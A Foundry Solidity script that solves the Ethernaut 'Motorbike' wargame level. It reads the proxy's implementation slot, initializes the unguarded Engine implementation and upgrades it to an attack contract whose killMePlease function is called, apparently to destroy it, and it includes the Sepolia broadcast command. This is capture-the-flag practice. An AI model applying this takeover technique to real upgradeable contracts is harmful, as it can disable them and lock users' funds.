// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import "../src/Level25.sol";
import {Attack} from "../src/Level25Attack.sol";

contract Level25 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));
    address payable _instanceAddr = payable(vm.envAddress("LVL25_ADDR"));
    bytes32 memorySlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() public {
        address _engineAddr = address(uint160(uint256(vm.load(_instanceAddr, memorySlot))));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack _attack = new Attack();

        Engine(_engineAddr).initialize();
        Engine(_engineAddr).upgradeToAndCall(address(_attack), abi.encodeWithSelector(_attack.killMePlease.selector));

        address newImplementationAddr = address(uint160(uint256(vm.load(_engineAddr, memorySlot))));

        if (newImplementationAddr == address(_attack)) {
            _ethernaut.submitLevelInstance(_instanceAddr);
        } else {
            console2.log("Still not good");
        }
    }
}

// forge script script/Level25.s.sol --broadcast --rpc-url sepolia -vvv
